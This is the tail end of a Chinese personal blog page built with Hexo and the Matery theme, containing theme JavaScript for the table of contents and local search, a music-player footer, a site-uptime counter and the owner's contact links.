        </div>
    </div>
</div>

<!-- TOC 悬浮按钮. -->

<div id="floating-toc-btn" class="hide-on-med-and-down">
    <a class="btn-floating btn-large bg-color">
        <i class="fas fa-list-ul"></i>
    </a>
</div>


<script src="/libs/tocbot/tocbot.min.js"></script>
<script>
    $(function () {
        tocbot.init({
            tocSelector: '#toc-content',
            contentSelector: '#articleContent',
            headingsOffset: -($(window).height() * 0.4 - 45),
            collapseDepth: Number('0'),
            headingSelector: 'h2, h3, h4'
        });

        // modify the toc link href to support Chinese.
        let i = 0;
        let tocHeading = 'toc-heading-';
        $('#toc-content a').each(function () {
            $(this).attr('href', '#' + tocHeading + (++i));
        });

        // modify the heading title id to support Chinese.
        i = 0;
        $('#articleContent').children('h2, h3, h4').each(function () {
            $(this).attr('id', tocHeading + (++i));
        });

        // Set scroll toc fixed.
        let tocHeight = parseInt($(window).height() * 0.4 - 64);
        let $tocWidget = $('.toc-widget');
        $(window).scroll(function () {
            let scroll = $(window).scrollTop();
            /* add post toc fixed. */
            if (scroll > tocHeight) {
                $tocWidget.addClass('toc-fixed');
            } else {
                $tocWidget.removeClass('toc-fixed');
            }
        });

        
        /* 修复文章卡片 div 的宽度. */
        let fixPostCardWidth = function (srcId, targetId) {
            let srcDiv = $('#' + srcId);
            if (srcDiv.length === 0) {
                return;
            }

            let w = srcDiv.width();
            if (w >= 450) {
                w = w + 21;
            } else if (w >= 350 && w < 450) {
                w = w + 18;
            } else if (w >= 300 && w < 350) {
                w = w + 16;
            } else {
                w = w + 14;
            }
            $('#' + targetId).width(w);
        };

        // 切换TOC目录展开收缩的相关操作.
        const expandedClass = 'expanded';
        let $tocAside = $('#toc-aside');
        let $mainContent = $('#main-content');
        $('#floating-toc-btn .btn-floating').click(function () {
            if ($tocAside.hasClass(expandedClass)) {
                $tocAside.removeClass(expandedClass).hide();
                $mainContent.removeClass('l9');
            } else {
                $tocAside.addClass(expandedClass).show();
                $mainContent.addClass('l9');
            }
            fixPostCardWidth('artDetail', 'prenext-posts');
        });
        
    });
</script>

    

</main>




    <footer class="page-footer bg-color">
    
        <link rel="stylesheet" href="/libs/aplayer/APlayer.min.css">
<style>
    .aplayer .aplayer-lrc p {
        
        display: none;
        
        font-size: 12px;
        font-weight: 700;
        line-height: 16px !important;
    }

    .aplayer .aplayer-lrc p.aplayer-lrc-current {
        
        display: none;
        
        font-size: 15px;
        color: #42b983;
    }

    
    .aplayer.aplayer-fixed.aplayer-narrow .aplayer-body {
        left: -66px !important;
    }

    .aplayer.aplayer-fixed.aplayer-narrow .aplayer-body:hover {
        left: 0px !important;
    }

    
</style>
<div class="">
    
    <div class="row">
        <meting-js class="col l8 offset-l2 m10 offset-m1 s12"
                   server="netease"
                   type="playlist"
                   id="503838841"
                   fixed='true'
                   autoplay='false'
                   theme='#42b983'
                   loop='all'
                   order='random'
                   preload='auto'
                   volume='0.7'
                   list-folded='true'
        >
        </meting-js>
    </div>
</div>

<script src="/libs/aplayer/APlayer.min.js"></script>
<script src="https://cdn.jsdelivr.net/npm/meting@2/dist/Meting.min.js"></script>

    

    <div class="container row center-align"
         style="margin-bottom: 15px !important;">
        <div class="col s12 m8 l8 copy-right">
            Copyright&nbsp;&copy;
            
                <span id="year">2021</span>
            
            <span id="year">2021</span>
            <a href="/about" target="_blank">晚安，早点休息</a>
            |&nbsp;Powered by&nbsp;<a href="https://hexo.io/" target="_blank">Hexo</a>
            |&nbsp;Theme&nbsp;<a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank">Matery</a>
            <br>
            
            
            
                
            
            
                <span id="busuanzi_container_site_pv">
                &nbsp;|&nbsp;<i class="far fa-eye"></i>&nbsp;总访问量:&nbsp;
                    <span id="busuanzi_value_site_pv" class="white-color"></span>
            </span>
            
            
                <span id="busuanzi_container_site_uv">
                &nbsp;|&nbsp;<i class="fas fa-users"></i>&nbsp;总访问人数:&nbsp;
                    <span id="busuanzi_value_site_uv" class="white-color"></span>
            </span>
            
            <br>

            <!-- 运行天数提醒. -->
            
                <span id="sitetime"> Loading ...</span>
                <script>
                    var calcSiteTime = function () {
                        var seconds = 1000;
                        var minutes = seconds * 60;
                        var hours = minutes * 60;
                        var days = hours * 24;
                        var years = days * 365;
                        var today = new Date();
                        var startYear = "2021";
                        var startMonth = "9";
                        var startDate = "4";
                        var startHour = "0";
                        var startMinute = "0";
                        var startSecond = "0";
                        var todayYear = today.getFullYear();
                        var todayMonth = today.getMonth() + 1;
                        var todayDate = today.getDate();
                        var todayHour = today.getHours();
                        var todayMinute = today.getMinutes();
                        var todaySecond = today.getSeconds();
                        var t1 = Date.UTC(startYear, startMonth, startDate, startHour, startMinute, startSecond);
                        var t2 = Date.UTC(todayYear, todayMonth, todayDate, todayHour, todayMinute, todaySecond);
                        var diff = t2 - t1;
                        var diffYears = Math.floor(diff / years);
                        var diffDays = Math.floor((diff / days) - diffYears * 365);

                        // 区分是否有年份.
                        var language = 'zh-CN';
                        if (startYear === String(todayYear)) {
                            document.getElementById("year").innerHTML = todayYear;
                            var daysTip = 'This site has been running for ' + diffDays + ' days';
                            if (language === 'zh-CN') {
                                daysTip = '本站已运行 ' + diffDays + ' 天';
                            } else if (language === 'zh-HK') {
                                daysTip = '本站已運行 ' + diffDays + ' 天';
                            }
                            document.getElementById("sitetime").innerHTML = daysTip;
                        } else {
                            document.getElementById("year").innerHTML = startYear + " - " + todayYear;
                            var yearsAndDaysTip = 'This site has been running for ' + diffYears + ' years and '
                                + diffDays + ' days';
                            if (language === 'zh-CN') {
                                yearsAndDaysTip = '本站已运行 ' + diffYears + ' 年 ' + diffDays + ' 天';
                            } else if (language === 'zh-HK') {
                                yearsAndDaysTip = '本站已運行 ' + diffYears + ' 年 ' + diffDays + ' 天';
                            }
                            document.getElementById("sitetime").innerHTML = yearsAndDaysTip;
                        }
                    }

                    calcSiteTime();
                </script>
            
            <br>
            
        </div>
        <div class="col s12 m4 l4 social-link social-statis">
    <a href="https://github.com/Lim135" class="tooltipped" target="_blank" data-tooltip="访问我的GitHub" data-position="top" data-delay="50">
        <i class="fab fa-github"></i>
    </a>



    <a href="mailto:876848785@qq.com" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
        <i class="fas fa-envelope-open"></i>
    </a>







    <a href="tencent://AddContact/?fromId=50&fromSubId=1&subcmd=all&uin=876848785" class="tooltipped" target="_blank" data-tooltip="QQ联系我: 876848785" data-position="top" data-delay="50">
        <i class="fab fa-qq"></i>
    </a>







    <a href="/atom.xml" class="tooltipped" target="_blank" data-tooltip="RSS 订阅" data-position="top" data-delay="50">
        <i class="fas fa-rss"></i>
    </a>

</div>
    </div>
</footer>

<div class="progress-bar"></div>


    <!-- 搜索遮罩框 -->
<div id="searchModal" class="modal">
    <div class="modal-content">
        <div class="search-header">
            <span class="title"><i class="fas fa-search"></i>&nbsp;&nbsp;搜索</span>
            <input type="search" id="searchInput" name="s" placeholder="请输入搜索的关键字"
                   class="search-input">
        </div>
        <div id="searchResult"></div>
    </div>
</div>

<script type="text/javascript">
$(function () {
    var searchFunc = function (path, search_id, content_id) {
        'use strict';
        $.ajax({
            url: path,
            dataType: "xml",
            success: function (xmlResponse) {
                // get the contents from search data
                var datas = $("entry", xmlResponse).map(function () {
                    return {
                        title: $("title", this).text(),
                        content: $("content", this).text(),
                        url: $("url", this).text()
                    };
                }).get();
                var $input = document.getElementById(search_id);
                var $resultContent = document.getElementById(content_id);
                $input.addEventListener('input', function () {
                    var str = '<ul class=\"search-result-list\">';
                    var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
                    $resultContent.innerHTML = "";
                    if (this.value.trim().length <= 0) {
                        return;
                    }
                    // perform local searching
                    datas.forEach(function (data) {
                        var isMatch = true;
                        var data_title = data.title.trim().toLowerCase();
                        var data_content = data.content.trim().replace(/<[^>]+>/g, "").toLowerCase();
                        var data_url = data.url;
                        data_url = data_url.indexOf('/') === 0 ? data.url : '/' + data_url;
                        var index_title = -1;
                        var index_content = -1;
                        var first_occur = -1;
                        // only match artiles with not empty titles and contents
                        if (data_title !== '' && data_content !== '') {
                            keywords.forEach(function (keyword, i) {
                                index_title = data_title.indexOf(keyword);
                                index_content = data_content.indexOf(keyword);
                                if (index_title < 0 && index_content < 0) {
                                    isMatch = false;
                                } else {
                                    if (index_content < 0) {
                                        index_content = 0;
                                    }
                                    if (i === 0) {
                                        first_occur = index_content;
                                    }
                                }
                            });
                        }
                        // show search results
                        if (isMatch) {
                            str += "<li><a href='" + data_url + "' class='search-result-title'>" + data_title + "</a>";
                            var content = data.content.trim().replace(/<[^>]+>/g, "");
                            if (first_occur >= 0) {
                                // cut out 100 characters
                                var start = first_occur - 20;
                                var end = first_occur + 80;
                                if (start < 0) {
                                    start = 0;
                                }
                                if (start === 0) {
                                    end = 100;
                                }
                                if (end > content.length) {
                                    end = content.length;
                                }
                                var match_content = content.substr(start, end);
                                // highlight all keywords
                                keywords.forEach(function (keyword) {
                                    var regS = new RegExp(keyword, "gi");
                                    match_content = match_content.replace(regS, "<em class=\"search-keyword\">" + keyword + "</em>");
                                });

                                str += "<p class=\"search-result\">" + match_content + "...</p>"
                            }
                            str += "</li>";
                        }
                    });
                    str += "</ul>";
                    $resultContent.innerHTML = str;
                });
            }
        });
    };

    searchFunc('/search.xml', 'searchInput', 'searchResult');
});
</script>

    <!-- 回到顶部按钮 -->
<div id="backTop" class="top-scroll">
    <a class="btn-floating btn-large waves-effect waves-light" href="#!">
        <i class="fas fa-arrow-up"></i>
    </a>
</div>


    <script src="/libs/materialize/materialize.min.js"></script>
    <script src="/libs/masonry/masonry.pkgd.min.js"></script>
    <script src="/libs/aos/aos.js"></script>
    <script src="/libs/scrollprogress/scrollProgress.min.js"></script>
    <script src="/libs/lightGallery/js/lightgallery-all.min.js"></script>
    <script src="/js/matery.js"></script>

    <!-- Baidu Analytics -->

    <!-- Baidu Push -->

<script>
    (function () {
        var bp = document.createElement('script');
        var curProtocol = window.location.protocol.split(':')[0];
        if (curProtocol === 'https') {
            bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
        } else {
            bp.src = 'http://push.zhanzhang.baidu.com/push.js';
        }
        var s = document.getElementsByTagName("script")[0];
        s.parentNode.insertBefore(bp, s);
    })();
</script>

    
    <script src="/libs/others/clicklove.js" async="async"></script>
    
    
    <script async src="/libs/others/busuanzi.pure.mini.js"></script>
    

    

    

    <!--腾讯兔小巢-->
    
    

    

    

    
    <script src="/libs/instantpage/instantpage.js" type="module"></script>
    

</body>

</html>
